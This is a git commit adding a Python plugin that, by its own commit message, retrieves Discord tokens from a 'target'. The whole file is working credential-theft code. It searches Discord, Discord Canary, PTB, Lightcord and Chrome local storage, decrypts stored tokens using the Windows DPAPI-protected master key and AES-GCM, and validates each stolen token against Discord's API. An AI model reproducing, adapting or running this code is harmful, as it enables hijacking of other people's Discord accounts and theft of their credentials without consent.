423bc75ef8d38aeec073bdc99ea2121b761eb7be
Faccin27 <gfaccin27@gmail.com>
2024-09-13 20:03:47 -0300

    feat: add plugin to retrieve Discord token from target

---
+++ plugins/discordtoken.py
@@ -0,0 +1,81 @@
+import base64
+import json
+import os
+import re
+from Crypto.Cipher import AES
+from win32crypt import CryptUnprotectData
+import requests  # Importando o módulo requests
+
+class TokenExtractor:
+    def __init__(self):
+        self.base_url = "https://discord.com/api/v9/users/@me"
+        self.appdata = os.getenv("localappdata")
+        self.roaming = os.getenv("appdata")
+        self.regexp_enc = r"dQw4w9WgXcQ:[^\"]*"
+        self.tokens = []
+
+    def extract_tokens(self):
+        paths = {
+            'Discord': self.roaming + '\\discord\\Local Storage\\leveldb\\',
+            'Discord Canary': self.roaming + '\\discordcanary\\Local Storage\\leveldb\\',
+            'Lightcord': self.roaming + '\\Lightcord\\Local Storage\\leveldb\\',
+            'Discord PTB': self.roaming + '\\discordptb\\Local Storage\\leveldb\\',
+            'Chrome': self.appdata + '\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\',
+        }
+
+        for name, path in paths.items():
+            if not os.path.exists(path):
+                continue
+            _discord = name.replace(" ", "").lower()
+            if "cord" in path:
+                if not os.path.exists(self.roaming+f'\\{_discord}\\Local State'):
+                    continue
+                for file_name in os.listdir(path):
+                    if file_name[-3:] not in ["log", "ldb"]:
+                        continue
+                    for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
+                        for y in re.findall(self.regexp_enc, line):
+                            token = self.decrypt_val(base64.b64decode(y.split('dQw4w9WgXcQ:')[1]),
+                                                    self.get_master_key(self.roaming+f'\\{_discord}\\Local State'))
+                            if self.validate_token(token):
+                                self.tokens.append(token)
+            else:
+                for file_name in os.listdir(path):
+                    if file_name[-3:] not in ["log", "ldb"]:
+                        continue
+                    for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
+                        for token in re.findall(self.regexp_enc, line):
+                            if self.validate_token(token):
+                                self.tokens.append(token)
+
+    def validate_token(self, token):
+        response = requests.get(self.base_url, headers={'Authorization': token})
+        return response.status_code == 200
+
+    def decrypt_val(self, buff, master_key):
+        iv = buff[3:15]
+        payload = buff[15:]
+        cipher = AES.new(master_key, AES.MODE_GCM, iv)
+        decrypted_pass = cipher.decrypt(payload)
+        return decrypted_pass[:-16].decode()
+
+    def get_master_key(self, path):
+        if not os.path.exists(path):
+            return None
+        if 'os_crypt' not in open(path, 'r', encoding='utf-8').read():
+            return None
+        with open(path, "r", encoding="utf-8") as f:
+            local_state = json.load(f)
+        master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
+        master_key = master_key[5:]
+        return CryptUnprotectData(master_key, None, None, None, 0)[1]
+
+    def get_tokens(self):
+        self.extract_tokens()
+        return self.tokens
+
+if __name__ == "__main__":
+    extractor = TokenExtractor()
+    tokens = extractor.get_tokens()
+    for token in tokens:
+        print(token)
